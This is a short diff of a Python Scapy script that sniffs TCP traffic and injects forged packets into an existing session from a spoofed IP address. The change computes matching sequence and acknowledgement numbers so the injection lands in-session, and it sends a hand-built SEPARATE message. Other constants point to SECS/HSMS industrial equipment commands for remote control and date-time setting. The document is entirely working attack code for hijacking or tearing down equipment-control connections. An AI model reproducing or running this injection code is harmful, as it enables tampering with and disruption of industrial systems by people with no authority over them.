@@ -19,8 +19,9 @@ def callback(pkt):
             # print(pkt[Raw].load)
             if pkt[Raw].load[9] == 0x6:
                 ip = IP(src = "192.168.0.11", dst = "192.168.0.10")
-                tcp = TCP(sport = 5000, dport = previousPacket.sport, seq = previousPacket.ack)
-                toSend = ip/tcp
+                newAck = previousPacket.seq + pkt[IP].len - 0x28
+                tcp = TCP(sport = 5000, dport = previousPacket.sport, seq = previousPacket.ack, ack = newAck, flags = "AP")
+                toSend = ip/tcp/payload1
                 send(toSend)
 
             
@@ -46,9 +47,11 @@ if __name__ == "__main__":
     S2F31_DATETIMESET_2 += b'\x30\x38\x31\x37'
     S2F31_DATETIMESET_2 += b'\x31\x31\x32\x32\x33\x33\x30\x30'
 
-    SEPARATE = b''
+    SEPARATE = b'\x00\x00\x00\x0A'
+    SEPARATE += b'\xFF\xFF\x00\x00'
+    SEPARATE += b'\x00\x09\xC3\x7B\xCB\x31'
 
-    payload1 = S2F41_REMOTE_1
+    payload1 = SEPARATE
     payload2 = S2F41_REMOTE_2
 
     sniff(filter = "tcp", prn = callback, iface = "以太网 2")
